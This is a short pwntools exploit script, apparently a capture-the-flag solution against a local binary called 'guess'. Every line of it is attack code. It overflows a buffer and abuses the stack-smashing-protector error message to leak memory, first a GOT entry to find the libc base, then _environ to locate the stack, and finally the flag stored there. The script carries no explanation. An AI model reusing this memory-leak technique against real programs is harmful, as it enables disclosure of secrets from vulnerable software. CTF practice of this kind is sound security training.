from pwn import *
#context.log_level = 'debug'

io = process("./guess")
elf = ELF("./guess")
libc = elf.libc

def leak(content, flag=False):
	payload = 'A'*0x128 + content
	io.sendlineafter('flag\n', payload)
	if not flag:
		io.recvuntil('***: ')
		return u64(io.recvuntil(' terminated', drop=True).ljust(8, '\x00'))

puts = leak(p64(elf.got['puts']))
libc_base = puts - libc.symbols['puts']
print hex(puts)
print hex(libc_base)

environ = libc_base + libc.symbols['_environ']
environ = leak(p64(environ))

flag = environ - 0x168
print hex(flag)

leak(p64(flag), flag=True)
io.interactive()

